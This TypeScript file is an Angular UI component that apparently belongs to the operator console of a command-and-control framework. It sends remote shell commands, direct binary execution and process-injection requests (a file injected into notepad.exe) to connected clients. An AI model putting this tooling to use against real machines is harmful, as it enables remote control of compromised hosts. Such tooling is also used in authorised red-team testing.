import { Component, OnInit, Input } from '@angular/core';
import { HttpErrorResponse } from '@angular/common/http';
import { PacketInfo, Packet, Campaign, DirEntry, ClientInfo } from '../app.model';
import { ApiService } from '../api.service';
import { DataService } from '../data.service';
import { first, take, skipWhile } from 'rxjs/operators';
import {FormControl} from '@angular/forms';
import {Observable} from 'rxjs';
import {map, startWith} from 'rxjs/operators';
import { ConfigService } from '../config.service';

export interface User {
  name: string;
}

@Component({
  selector: 'app-cmd-exec',
  templateUrl: './cmd-exec.component.html',
  styleUrls: ['./cmd-exec.component.css']
})
export class CmdExecComponent implements OnInit {
  // Input
  @Input() clientId = "";
  downstreamId: string = "client"

  // UI for all
  selectExecType: string = "cmd"
  
  // cmd, powershell
  commandline: string = "hostname"
  
  // direct
  executable: string = "c:\\windows\\system32\\net.exe"
  argline: string = ""
  selectSpawnType: string = "standard"
  destination: string = "C:\\temp\\server.exe"

  // remote
  remote_file: string = ""
  remote_argline: string = ""
  remote_injectInto: string = "c:\\windows\\notepad.exe"

  constructor(
    private apiService: ApiService,
    private dataService: DataService,
    private configService: ConfigService,
  ) { }

  destinationFormControl = new FormControl();
  destinationOptions: string[] = [];
  destinationFilteredOptions: Observable<string[]>;

  private _filter(value: string): string[] {
    const filterValue = value.toLowerCase();
    return this.destinationOptions.filter(option => option.toLowerCase().includes(filterValue));
  }

  displayFn(s: string): string {
    return s;
  }

  ngOnInit(): void {
    this.destinationOptions = this.configService.getSpawnData();
    this.destinationFilteredOptions = this.destinationFormControl.valueChanges.pipe(
      startWith(''),
      map(value => this._filter(value)),
    );

    // Only consume one valid, to have the truth
    // Skip empty array, and take 1
    this.dataService.clients.pipe(skipWhile(v => v.length == 0), take(1)).subscribe((clientInfos: ClientInfo[]) => {
      var client = clientInfos.find(ci => ci.ClientId == this.clientId);
      if (client != undefined) {
        var arch = client.Arch;
        if (arch == "darwin") {
          this.selectExecType = "zsh";
        } else if (arch == "linux") {
          this.selectExecType = "bash";
        }
      }
    });

    // Downstream-Selection
    this.dataService.downstreamSelection.subscribe(downstreamId => {
      this.downstreamId = downstreamId;
    });
  }

  
  sendPacketExec() {
    var params:{ [id: string]: string } = {};
    var packetType: string;
    

    if (this.selectExecType == "cmd" || this.selectExecType == "powershell") {
      packetType = "execShell";
      params["shelltype"] = this.selectExecType;
      params["commandline"] = this.commandline;

    } else if (this.selectExecType == "direct") {
      packetType = "execLol";
      params["executable"] = this.executable;
      params["argline"] = this.argline;

      if (this.selectSpawnType != "standard") {
        params["spawnType"] = this.selectSpawnType;
        params["spawnData"] = this.destination;
      }
    } else if (this.selectExecType == "remote") {
      packetType = "execRemote";

      params["filename"] = this.remote_file;
      params["argline"] = this.remote_argline;
      params["injectInto"] = this.remote_injectInto;
      params["type"] = "";

    } else {
      console.log("Unknown: " + this.selectExecType);
      return;
    }

    var packet = this.apiService.makePacket(
      this.clientId,
      packetType,
      params,
      this.downstreamId,
    );
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );

    if (! this.destinationOptions.includes(this.destination)) {
      this.destinationOptions.push(this.destination);
    }
    this.configService.setSpawnData(this.destinationOptions);
  }


}
